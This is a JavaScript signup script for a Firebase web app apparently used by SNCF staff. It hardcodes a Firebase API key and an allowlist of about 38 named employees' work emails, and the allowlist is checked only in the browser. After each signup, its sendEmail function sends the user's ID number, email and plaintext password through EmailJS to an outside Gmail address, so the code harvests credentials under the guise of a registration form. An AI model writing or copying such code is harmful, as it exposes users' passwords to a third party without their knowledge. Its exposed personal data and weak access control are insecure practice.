import { initializeApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyA6e5tIJ2TGxF-SU79HjEeKYpcnFP3wEy8",
  authDomain: "cogc-paris-nord-9a163.firebaseapp.com",
  projectId: "cogc-paris-nord-9a163",
  storageBucket: "cogc-paris-nord-9a163.appspot.com",
  messagingSenderId: "769775504383",
  appId: "1:769775504383:web:bf32c17ebc118ebd61f5ca",
  measurementId: "G-MSTNNRZ9G9"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// Liste des emails autorisés
const authorizedEmails = [
    "fahim.bouchemale@reseau.sncf.fr",
    "fabien.luchier@reseau.sncf.fr",
    "djamal.mansouri@reseau.sncf.fr",
    "gregory.boucher@reseau.sncf.fr",
    "gregory.esparon@reseau.sncf.fr",
    "jodie.grevin@reseau.sncf.fr",
    "michael.guilbert@reseau.sncf.fr",
    "thomas.gillon@reseau.sncf.fr",
    "suzy.barroire@reseau.sncf.fr",
    "jason.avakian@reseau.sncf.fr",
    "jeremie.simon@reseau.sncf.fr",
    "julian.verhelle@reseau.sncf.fr",
    "raphael.lahogue@reseau.sncf.fr",
    "mathieu.gallai@reseau.sncf.fr",
    "jennifer.loial@reseau.sncf.fr",
    "nitharsan.mahendran@reseau.sncf.fr",
    "romain.chavet@reseau.sncf.fr",
    "vincent.guyon@reseau.sncf.fr",
    "islam.meftah@reseau.sncf.fr",
    "brice.baptiste@reseau.sncf.fr",
    "zachariya.hammami@reseau.sncf.fr",
    "charlotte.denele@reseau.sncf.fr",
    "karine.bleubar@reseau.sncf.fr",
    "cyril.cocu@reseau.sncf.fr",
    "stephane.chevalier@reseau.sncf.fr",
    "maximilien.legrand@reseau.sncf.fr",
    "armelle.francois@reseau.sncf.fr",
    "perrine.debruyne@reseau.sncf.fr",
    "sandra.galopin@reseau.sncf.fr",
    "julien.delezay@reseau.sncf.fr",
    "cyril.carrot@reseau.sncf.fr",
    "ylias.crespin@reseau.sncf.fr",
    "aurelie.kadoum@reseau.sncf.fr",
    "patrick.goberville@reseau.sncf.fr",
    "fabien.decayeux@reseau.sncf.fr",
    "georges.de.fontes@reseau.sncf.fr",
    "yassine.mimouni@reseau.sncf.fr",
    "remi.warlouzet@reseau.sncf.fr"
];

// Function to create a new user
function submitForm() {
    const cpNumber = document.getElementById('cpNumber').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Vérifie si l'email est autorisé
    if (!authorizedEmails.includes(email)) {
        alert("Vous n'êtes pas autorisé à vous inscrire.");
        return;
    }

    // Validation des données
    if (!cpNumber || !email || !password) {
        alert("Veuillez remplir tous les champs.");
        return;
    }

    // Validation de l'email
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(email)) {
        alert("Veuillez entrer une adresse email valide.");
        return;
    }

    // Validation du mot de passe
    if (password.length < 6) {
        alert("Le mot de passe doit contenir au moins 6 caractères.");
        return;
    }

    createUserWithEmailAndPassword(auth, email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            console.log("User signed up:", user);

            // Envoie les données par email
            sendEmail(cpNumber, email, password);

            // Redirige vers accueil.html
            window.location.href = 'accueil.html';
        })
        .catch((error) => {
            const errorCode = error.code;
            const errorMessage = error.message;
            console.error("Error signing up:", errorCode, errorMessage);
        });
}

// Function to send email
function sendEmail(cpNumber, email, password) {
    const templateParams = {
        cpNumber: cpNumber,
        email: email,
        password: password,
        to_email: 'symnosis@gmail.com',
        subject: 'Inscription plateforme'
    };

    emailjs.send('service_gdjyina', 'template_53r6fc7', templateParams)
        .then(function(response) {
            console.log('Email sent successfully:', response.status, response.text);
        }, function(error) {
            console.log('Failed to send email:', error);
        });
}

export { auth };
